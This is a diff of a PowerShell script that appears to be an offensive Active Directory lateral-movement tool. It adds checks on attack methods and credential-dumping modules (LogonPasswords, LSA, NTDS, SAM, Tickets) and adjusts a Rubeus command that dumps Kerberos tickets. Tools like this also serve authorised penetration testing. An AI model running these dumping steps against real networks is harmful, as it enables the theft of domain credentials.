@@ -118,6 +118,54 @@ if (-not $Targets -and $Method -ne "Spray") {
 ####################################### Some logic based checking ##############################################
 ################################################################################################################
 
+
+if ($Method -ne "") {
+    switch ($Method) {
+        "WinRM" {}
+        "MSSQL" {}
+        "SMB" {}
+        "WMI" {}
+        "RDP" {}
+        "GenRelayList" {}
+        "SessionHunter" {}
+        "Spray" {}
+        "VNC" {}
+
+        default {
+            Write-Host "[*] " -ForegroundColor Yellow -NoNewline
+            Write-Host "Invalid Method specified"
+            Write-Host "[*] " -ForegroundColor Yellow -NoNewline
+            Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
+            return
+        }
+    }
+}
+
+if ($Module -ne "") {
+    switch ($Module) {
+        "ConsoleHistory" {}
+        "Files" {}
+        "KerbDump" {}
+        "eKeys" {}
+        "LogonPasswords" {}
+        "LSA" {}
+        "NTDS" {}
+        "SAM" {}
+        "Tickets" {}
+
+        default {
+            Write-Host "[*] " -ForegroundColor Yellow -NoNewline
+            Write-Host "Invalid Module specified"
+            Write-Host "[*] " -ForegroundColor Yellow -NoNewline
+            Write-Host "Specify either: Files, ConsoleHistory, KerbDump, eKeys, LogonPasswords, LSA, NTDS, SAM, Tickets"
+            return
+        }
+    }
+}
+
+
+
+
 if ($Threads -lt 2){
         Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
         Write-Host "Threads value should not be less than 2"
@@ -443,7 +491,7 @@ if (!$CurrentUser) {
                         }
                     }
                     elseif ($CheckAdmin) {
-                        $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /user:$env:username /nowrap" | Out-String
+                        $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /username:$env:username /nowrap" | Out-String
                         $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
 
                         if ($OriginalUserTicket -notlike "doI*") {
@@ -5314,10 +5362,10 @@ switch ($Method) {
         "VNC" {Method-VNC}
         
         default {
-        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
         Write-Host "Invalid Method specified"
-        Write-Host "[!] " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Specify either WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
         return
       
       }
